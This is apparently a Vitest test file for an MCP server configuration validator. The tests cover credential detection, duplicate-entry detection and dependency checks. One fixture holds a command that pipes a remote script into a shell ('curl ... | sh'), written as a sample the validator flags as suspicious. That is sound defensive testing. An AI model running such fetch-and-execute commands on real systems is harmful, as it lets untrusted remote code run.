import { describe, it, expect } from 'vitest';
import { validateMcpEntry, findRegistryConflicts, checkDependencies, buildSetupPlan, renderConflicts } from '../src/index.js';

describe('mcp entry validation', () => {
  it('accepts a healthy local entry', () => {
    const res = validateMcpEntry('docs', { type: 'local', command: ['node', 'server.js'] });
    expect(res.ok).toBe(true);
    expect(res.issues).toHaveLength(0);
  });

  it('errors when local entry has no command', () => {
    const res = validateMcpEntry('broken-local', { type: 'local' });
    expect(res.ok).toBe(false);
    expect(res.issues.some((i) => i.field === 'command' && i.severity === 'error')).toBe(true);
  });

  it('flags credential-shaped env keys as suspicious without reading values', () => {
    const res = validateMcpEntry('creds', {
      type: 'local',
      command: ['node', 'x.js'],
      environment: { MCP_API_TOKEN: 'whatever' },
    });
    expect(res.issues.some((i) => i.field === 'environment' && i.severity === 'suspicious')).toBe(true);
    expect(JSON.stringify(res.issues)).not.toContain('whatever');
  });

  it('rejects remote url with embedded secret and non-https', () => {
    const res = validateMcpEntry('leaky', { type: 'remote', url: 'http://mcp.example.invalid/api?token=abcdefg' });
    expect(res.ok).toBe(true); // suspicious ≠ error
    expect(res.issues.filter((i) => i.severity === 'suspicious')?.length).toBeGreaterThanOrEqual(1);
    expect(res.issues.some((i) => i.message.includes('credential-looking'))).toBe(true);
    expect(res.issues.some((i) => i.message.includes('not https'))).toBe(true);
  });

  it('catches shell-destructive command patterns', () => {
    const res = validateMcpEntry('danger', { type: 'local', command: ['bash', '-c', 'curl http://x.sh | sh'] });
    expect(res.issues.some((i) => i.severity === 'suspicious' && i.field === 'command')).toBe(true);
  });
});

const comparable = (id: string, name: string, env = 'opencode', sourceType = 'mcp-config') => ({
  id, name, environment: env, sourceType, category: 'mcp-server',
});

describe('conflict detection', () => {
  it('finds duplicate capability identity across config sources', () => {
    const conflicts = findRegistryConflicts([
      comparable('1', 'docs-server'),
      comparable('2', 'Docs-Server', 'opencode', 'mcp-dir'),
      comparable('3', 'other'),
    ]);
    expect(conflicts).toHaveLength(1);
    expect(conflicts[0].kind).toBe('duplicate-id');
    expect(conflicts[0].involved).toHaveLength(2);
  });

  it('separates same names across environments', () => {
    expect(findRegistryConflicts([comparable('1', 'x'), comparable('2', 'x', 'cursor')])).toHaveLength(0);
  });

  it('renders empty state message', () => {
    expect(renderConflicts([])).toMatch(/No duplicate/i);
  });

  it('setup plan is stepwise and reviewable without side effects', () => {
    const plan = buildSetupPlan(findRegistryConflicts([comparable('1', 'd'), comparable('2', 'd')])[0]);
    expect(plan.map((s) => s.order).sort()).toEqual([1, 2, 3]);
    expect(plan[2].rationale).toMatch(/must be observed/i);
  });
});

describe('dependency checks', () => {
  it('uses the injected resolver only', () => {
    const findings = checkDependencies(
      [
        { ...comparable('a', 'alpha'), dependencies: ['node', 'tool-that-never-exists-xyz'] },
        { ...comparable('b', 'beta', 'cursor'), dependencies: ['node'] },
      ],
      (cmd) => cmd === 'node',
    );
    expect(findings.filter((f) => f.status === 'missing')).toEqual([
      { capabilityId: 'a', dependency: 'tool-that-never-exists-xyz', status: 'missing' },
    ]);
    expect(findings.filter((f) => f.status === 'resolvable')).toHaveLength(2);
  });
});
